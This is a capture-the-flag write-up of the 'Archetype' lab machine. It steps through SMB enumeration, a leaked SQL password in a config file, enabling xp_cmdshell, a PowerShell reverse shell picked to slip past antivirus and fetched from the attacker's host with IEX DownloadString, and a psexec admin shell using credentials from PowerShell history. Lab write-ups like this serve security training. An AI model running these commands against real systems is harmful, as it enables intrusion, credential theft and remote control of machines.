# Archetype

As always the first thing I did was run 2 nmap scans:
```bash
sudo nmap -T4 -p- 10.10.10.27
sudo nmap -T4 -A -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.27 -o scan
```

2 caught my eye:
```
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
```

SMB and an MS SQL Server.


## SMB

I started by having a look at the SMB layout:

```bash
sudo smbclient -N -L \\\\10.10.10.27\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

This looked OK, so I connected to backups to see what was available:

```
sudo smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8249578 blocks available
```

This looked very promising, some kind of config file was available, so I downloaded it to see what was inside:

```
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)


kali@kali:$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

This gives us 2 bits of very useful information about the SQL server:
- Username - ARCHETYPE\sql_svc
- Password - M3g4c0rp123


## SQL Server

Using these credentials I was now able to log into the SQL server using Impacket's mssqlclient.py:

```
kali@kali:$ python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

The next step was to enable system commands to be run through the `xp_cmdshell` command, by running the following commands:
```
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE;
```

This allowed me to find the user flag using the following command:
```
xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"
```

This was good, but in order to get any further I knew I was going to need a reverse shell.

## Getting A Shell

Now that I knew I was able to run system commands through the SQL server I should be able to upload a file containing a reverse shell on the server and get a shell.

### 1. Setup a local server to host the exploit

I setup a simple python server which I could use to source my exploit:
```
python3 -m http.server 80
```

### 2. Setup an ncat listener as an endpoint for the reverse shell
```
nc -nlvp 4444
```

I then allowed access through the firewall to allow traffic to access the servers:

```
ufw allow from 10.10.10.27 proto tcp to any port 80,4444
```

### 3. Find a reverse shell

It took me a while to find the right reverse shell, as the antivirus kept on blocking the ones I was using. However I eventually found this one:
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.17.35",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 4. Run the reverse shell

Using powershell I was able to download and run the reverse shell:

```
xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.17.35/shell.ps1\");"
```

## Privilage Escalation

This turned out to be very simple, a quick check of the powershell history file showed that the backups drive had been mapped using the local administrator credentials:
```
PS type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Using another Impacket exploit I was able to gain a privilaged shell:
```
python3 psexec.py administrator@10.10.10.27

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file mQSRmrqV.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service idDI on 10.10.10.27.....
[*]Starting service idDI....
Press help for extra shell commands[!]
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
```

This gave me access to the flag:
```
type C:\Users\Administrator\Desktop\root.txt
```